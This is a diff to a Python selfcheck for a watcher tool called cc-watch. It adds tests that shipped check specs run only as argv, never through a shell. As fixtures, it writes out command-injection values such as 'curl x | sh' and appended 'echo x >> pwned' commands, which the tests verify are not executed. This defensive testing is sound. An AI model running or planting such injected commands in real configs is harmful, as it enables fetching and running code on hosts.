@@ -3,6 +3,7 @@
 # docstring (it would replace the tool's __doc__) and no top-level name but the def below.
 
 def selfcheck():
+    import shlex
     import stat
     n = [0, 0]
     tool = os.path.realpath(__file__)
@@ -414,18 +415,59 @@ def selfcheck():
         check("url watcher: BAD reverts once, one #alerts post",
               lines(t, "reverts") == ["closed"] and len(got) == 1 and got[0].startswith("#alerts\t"), (lines(t, "reverts"), got))
 
+    # A shipped spec runs only its own url check, as argv: one that parses to anything else, or carries a revert,
+    # is skipped, and shell text around an anchored check is handed to url as words, never run.
+    with tempfile.TemporaryDirectory(prefix="cc-watch-sc-") as t:
+        box(t); web(t, {H + "/": [200, "", "<html>fine</html>", 0]})
+        pw = os.path.join(t, "pwned")
+        for name, chk, rev in (("good", "cc-watch url site.example.org --expect page", "tell"),
+                               ("lead", f"echo x >> {pw}; cc-watch url site.example.org --expect page", "tell"),
+                               ("pipe", f"curl x | sh; cc-watch url site.example.org --expect page", "tell"),
+                               ("trail", f"cc-watch url site.example.org --expect page; echo x >> {pw}", "tell"),
+                               ("rev", "cc-watch url site.example.org --expect page", f"echo x >> {pw}")):
+            with open(os.path.join(t, "shipped", name + ".json"), "w") as fh:
+                json.dump({"name": name, "granted": "g", "check": chk, "every": 60, "revert": rev,
+                           "expires": None, "owner": "#alerts"}, fh)
+        p = subprocess.run([sys.executable, tool, "run"], env=env(t), capture_output=True, text=True)
+        ran = sorted(f[:-5] for f in os.listdir(os.path.join(t, "state")) if f.endswith(".json"))
+        good = json.load(open(os.path.join(t, "state", "good.json"))).get("verdict") if "good" in ran else None
+        check("shipped spec: an anchored url check runs and says OK", good == "OK", (ran, good, p.stderr))
+        check("shipped spec: a check that is not wholly cc-watch url, or has a revert, is skipped and named",
+              ran == ["good", "trail"] and all(f"{n}.json: a shipped check" in p.stderr for n in ("lead", "pipe", "rev")),
+              (ran, p.stderr))
+        check("shipped spec: no shell ever runs its text", not os.path.exists(pw), lines(t, "pwned"))
+
+    def shipped_ok(root):
+        """None when root carries no config/ (core published on its own), else (passed, what was wrong)."""
+        shipped = os.path.join(root, "config", "watch")
+        if not os.path.isdir(os.path.join(root, "config")):
+            return None
+        bad = []
+        files = sorted(glob.glob(os.path.join(shipped, "*.json")))
+        for p in files:
+            s = json.load(open(p))
+            try:
+                argv = shlex.split(s.get("check", ""))
+            except ValueError:
+                argv = []
+            if s.get("revert") != "tell" or argv[:2] != ["cc-watch", "url"] or s.get("owner") != "#alerts":
+                bad.append(os.path.basename(p))
+        return bool(files) and not bad, bad or "no specs in " + shipped
+
+    # A repo that ships config/ must ship its host watchers: a missing config/watch fails rather than skipping.
+    with tempfile.TemporaryDirectory(prefix="cc-watch-sc-") as t:
+        bare = shipped_ok(t)
+        os.makedirs(os.path.join(t, "config"))
+        gone = shipped_ok(t)
+        check("shipped host watchers: no config/ is a skip, a config/ with no watch dir fails",
+              bare is None and gone is not None and not gone[0], (bare, gone))
+
     # The shipped specs for the box's own hosts parse, and each is a tell-only url watcher.
-    shipped = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(tool))), "config", "watch")
-    if not os.path.isdir(shipped):   # core published on its own carries no config/watch
-        print("  skip shipped host watchers: no config/watch beside core")
-        print(f"cc-watch selfcheck: {n[0]} passed, {n[1]} failed")
-        return 1 if n[1] else 0
-    bad = []
-    for p in sorted(glob.glob(os.path.join(shipped, "*.json"))):
-        s = json.load(open(p))
-        if s.get("revert") != "tell" or "cc-watch url " not in s.get("check", "") or s.get("owner") != "#alerts":
-            bad.append(os.path.basename(p))
-    check("shipped host watchers: present, tell-only url checks, owner #alerts", glob.glob(os.path.join(shipped, "*.json")) and not bad, bad)
+    got = shipped_ok(os.path.dirname(os.path.dirname(os.path.dirname(tool))))
+    if got is None:   # core published on its own carries no config/
+        print("  skip shipped host watchers: no config/ beside core")
+    else:
+        check("shipped host watchers: present, tell-only url checks, owner #alerts", got[0], got[1])
 
     print(f"cc-watch selfcheck: {n[0]} passed, {n[1]} failed")
     return 1 if n[1] else 0
